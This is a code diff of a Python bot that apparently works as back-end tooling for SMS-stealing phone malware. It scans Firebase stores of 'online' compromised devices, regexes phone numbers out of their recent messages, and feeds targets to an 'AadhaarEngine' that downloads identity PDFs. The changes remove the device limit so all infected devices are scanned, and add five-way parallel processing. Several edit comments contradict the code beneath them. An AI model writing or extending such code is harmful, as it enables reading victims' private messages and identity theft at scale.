@@ -176,11 +176,11 @@ def firebase_list_text():
 # ==============================================================================
 # ✅ EDIT A: firebase_get_online_devices (now defaults to limit=5)
 # ==============================================================================
-async def firebase_get_online_devices(session, url, limit=5):
+async def firebase_get_online_devices(session, url, limit=None):
     """
     Fetch list of online client IDs from Firebase.
-    Mirrors Bb_Auto.py logic: only counts clients with status == True.
-    Returns up to `limit` devices (default 5).
+    Only counts clients with status == True.
+    `limit=None` → return ALL online devices (recommended for detection).
     """
     try:
         async with session.get(
@@ -195,7 +195,9 @@ async def firebase_get_online_devices(session, url, limit=5):
                 if isinstance(cdata, dict) and cdata.get("status") is True
             ]
             online.sort()
-            return online[:limit] if limit else online
+            if limit is None:
+                return online
+            return online[:limit]
     except Exception as e:
         print(f"⚠️ [FIREBASE] online-devices error on {url}: {e}")
         return []
@@ -260,14 +262,12 @@ async def firebase_get_all_keys(session, url, cid):
 # ==============================================================================
 # ✅ EDIT C: firebase_find_phone_map (now defaults to limit_devices=5)
 # ==============================================================================
-async def firebase_find_phone_map(session, url, limit_devices=5):
+async def firebase_find_phone_map(session, url, limit_devices=None):
     """
     Scan Firebase link and return {phone: cid} mapping of online devices.
-    bb_auto-accurate approach:
-      1. Get up to `limit_devices` online devices (status==True).
-      2. For each, fetch last 5 messages with orderBy="$key"&limitToLast=5.
-      3. Extract phone via regex on message body.
-      4. Deduplicate by phone (first-seen wins).
+    Detection phase — scans ALL online devices by default (`limit_devices=None`).
+    Per device, fetches only the last 5 messages (orderBy="$key"&limitToLast=5)
+    to extract the phone number quickly.
     """
     devices = await firebase_get_online_devices(session, url, limit=limit_devices)
     mapping = {}
@@ -619,7 +619,7 @@ class AadhaarEngine:
                         continue
                     try:
                         # ✅ EDIT D: limit_devices now 5
-                        mapping = await firebase_find_phone_map(session, url, limit_devices=5)
+                        mapping = await firebase_find_phone_map(session, url, limit_devices=None)
                         if target_mobile not in mapping:
                             continue
                         cid = mapping[target_mobile]
@@ -1271,10 +1271,13 @@ parallel_batches = {}  # batch_id -> {"task": asyncio.Task, "chat_id": int}
 # ==============================================================================
 # ✅ EDIT E: scan_all_firebase_phones default limit_per_link=5
 # ==============================================================================
-async def scan_all_firebase_phones(limit_per_link=5, max_targets=5):
+async def scan_all_firebase_phones(limit_per_link=None, max_targets=5):
     """
-    Scan all configured Firebase links and return a deduplicated list of
-    {"phone": "...", "url": "...", "cid": "..."} up to max_targets entries.
+    Scan all Firebase links and return up to `max_targets` phones.
+
+    - `limit_per_link=None` → detect ALL online devices per link (recommended)
+    - `max_targets=5`       → cap how many phones we hand off to the parallel runner
+                              (the runner itself enforces concurrency via Semaphore)
     """
     links = _load_firebase_links()
     if not links:
@@ -1370,17 +1373,21 @@ async def run_parallel_batch(bot, chat_id, mobile_targets):
         print(f"⚠️ [BATCH] Failed to announce: {e}")
 
     real_chat_id = chat_id
+    # 🔒 Exactly 5 phones processed at a time (parallelism cap)
+    PARALLEL_WORKERS = 5
+    _batch_sem = asyncio.Semaphore(PARALLEL_WORKERS)
 
     async def _run_one(t):
-        phone = t["phone"]
-        url = t["url"]
-        cid = t["cid"]
-        target_idx = t["index"]
+        async with _batch_sem:  # 🚦 allow at most 5 concurrent flows
+            phone = t["phone"]
+            url = t["url"]
+            cid = t["cid"]
+            target_idx = t["index"]
 
-        # Create a fresh engine bound to the real chat_id
-        engine = AadhaarEngine(bot, chat_id=real_chat_id)
-        # Unique suffix so parallel downloads / PDFs don't collide on disk
-        engine._unique_suffix = f"_p{target_idx}"
+            # Create a fresh engine bound to the real chat_id
+            engine = AadhaarEngine(bot, chat_id=real_chat_id)
+            # Unique suffix so parallel downloads / PDFs don't collide on disk
+            engine._unique_suffix = f"_p{target_idx}"
 
         # Prefix every status update with the target phone for parallel readability
         orig_update = engine.update_status
